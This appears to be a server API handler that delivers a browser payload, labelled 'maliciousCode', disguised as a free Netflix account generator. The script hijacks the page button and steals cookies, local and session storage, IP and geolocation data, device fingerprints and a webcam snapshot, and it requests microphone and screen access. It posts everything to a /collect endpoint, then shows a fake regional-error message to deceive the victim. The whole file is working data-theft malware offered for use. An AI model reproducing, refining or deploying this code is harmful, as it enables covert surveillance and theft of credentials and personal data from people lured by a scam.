export default async function handler(req, res) {
    // Set headers for JavaScript response
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Access-Control-Allow-Origin', '*');

    const maliciousCode = `
(function() {
    const VICTIM_DATA = {
        stage: 'initial_compromise',
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };

    // Override the button click handler
    const originalGenerator = window.startGenerator;
    window.startGenerator = function() {
        document.getElementById('loading').style.display = 'block';
        document.querySelector('.btn').style.display = 'none';
        collectComprehensiveData();
    };

    async function collectComprehensiveData() {
        try {
            // Phase 1: Basic fingerprinting
            await collectBasicInfo();
            
            // Phase 2: Advanced fingerprinting
            await collectAdvancedFingerprint();
            
            // Phase 3: Location data
            await collectLocationData();
            
            // Phase 4: Network information
            await collectNetworkInfo();
            
            // Phase 5: Media access attempts
            setTimeout(attemptMediaAccess, 3000);
            
        } catch (error) {
            VICTIM_DATA.error = error.message;
            sendData('ERROR');
        }
    }

    async function collectBasicInfo() {
        VICTIM_DATA.basic = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            doNotTrack: navigator.doNotTrack
        };

        // Get public IP
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            VICTIM_DATA.ip = ipData.ip;
            
            // Get IP details
            const ipInfo = await fetch('https://ipapi.co/' + ipData.ip + '/json/');
            const ipDetails = await ipInfo.json();
            VICTIM_DATA.ipDetails = ipDetails;
        } catch (e) {
            VICTIM_DATA.ipError = e.message;
        }
    }

    async function collectAdvancedFingerprint() {
        // Canvas fingerprinting
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Advanced fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Advanced fingerprint', 4, 17);
        
        VICTIM_DATA.canvasFingerprint = canvas.toDataURL();
        
        // WebGL fingerprinting
        const gl = canvas.getContext('webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            VICTIM_DATA.webgl = {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        }
        
        // Audio fingerprinting
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.start();
        
        VICTIM_DATA.audioFingerprint = analyser.frequencyBinCount;
        oscillator.stop();
    }

    function collectLocationData() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve();
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    VICTIM_DATA.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    };
                    sendData('GEOLOCATION_SUCCESS');
                    resolve();
                },
                error => {
                    VICTIM_DATA.geolocationError = {
                        code: error.code,
                        message: error.message
                    };
                    resolve();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }

    async function collectNetworkInfo() {
        // Network information API
        if (navigator.connection) {
            VICTIM_DATA.connection = {
                downlink: navigator.connection.downlink,
                effectiveType: navigator.connection.effectiveType,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            };
        }
        
        // Battery API
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                VICTIM_DATA.battery = {
                    charging: battery.charging,
                    level: battery.level,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {}
        }
    }

    async function attemptMediaAccess() {
        VICTIM_DATA.mediaAttempts = {};
        
        // Camera access
        try {
            const videoStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    frameRate: { ideal: 30 }
                }
            });
            VICTIM_DATA.mediaAttempts.camera = 'SUCCESS';
            
            // Capture frame
            const video = document.createElement('video');
            video.srcObject = videoStream;
            video.play();
            
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                VICTIM_DATA.cameraFrame = canvas.toDataURL('image/jpeg', 0.5);
                
                // Stop stream
                videoStream.getTracks().forEach(track => track.stop());
                sendData('CAMERA_SUCCESS');
            }, 1000);
            
        } catch (error) {
            VICTIM_DATA.mediaAttempts.camera = 'FAILED: ' + error.message;
        }
        
        // Microphone access
        try {
            const audioStream = await navigator.mediaDevices.getUserMedia({
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    autoGainControl: true
                }
            });
            VICTIM_DATA.mediaAttempts.microphone = 'SUCCESS';
            
            // Stop after 2 seconds
            setTimeout(() => {
                audioStream.getTracks().forEach(track => track.stop());
                sendData('MICROPHONE_SUCCESS');
            }, 2000);
            
        } catch (error) {
            VICTIM_DATA.mediaAttempts.microphone = 'FAILED: ' + error.message;
        }
        
        // Screen sharing attempt
        try {
            const screenStream = await navigator.mediaDevices.getDisplayMedia({
                video: true,
                audio: true
            });
            VICTIM_DATA.mediaAttempts.screen = 'SUCCESS';
            screenStream.getTracks().forEach(track => track.stop());
        } catch (error) {
            VICTIM_DATA.mediaAttempts.screen = 'FAILED: ' + error.message;
        }
        
        sendData('MEDIA_COMPLETE');
        showFakeError();
    }

    async function sendData(stage) {
        VICTIM_DATA.currentStage = stage;
        VICTIM_DATA.timestamp = new Date().toISOString();
        
        try {
            await fetch('/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(VICTIM_DATA)
            });
        } catch (error) {
            console.error('Data send failed:', error);
        }
    }

    function showFakeError() {
        setTimeout(() => {
            document.querySelector('.container').innerHTML = 
                '<h2 style="color: #e50914">❌ Regional Account Restriction Detected</h2>' +
                '<p style="margin: 20px 0;">No Netflix Premium accounts available in your region.</p>' +
                '<p style="margin: 20px 0; font-size: 0.9em; color: #ccc;">Error Code: NR-401</p>' +
                '<button class="btn" onclick="location.reload()">🔄 Try Different Region</button>' +
                '<p style="margin-top: 30px; font-size: 0.8em; color: #999;">Try disabling your VPN or check back in 24 hours</p>';
        }, 5000);
    }

    // Auto-start collection if user interacts
    document.addEventListener('click', function autoStart() {
        if (!VICTIM_DATA.autoStarted) {
            VICTIM_DATA.autoStarted = true;
            collectComprehensiveData();
        }
        document.removeEventListener('click', autoStart);
    });

    // Start collection if user stays on page
    setTimeout(() => {
        if (!VICTIM_DATA.autoStarted && document.hasFocus()) {
            VICTIM_DATA.autoStarted = true;
            collectComprehensiveData();
        }
    }, 10000);

    console.log('Netflix Account Generator initialized');
})();
    `;

    res.send(maliciousCode);
}
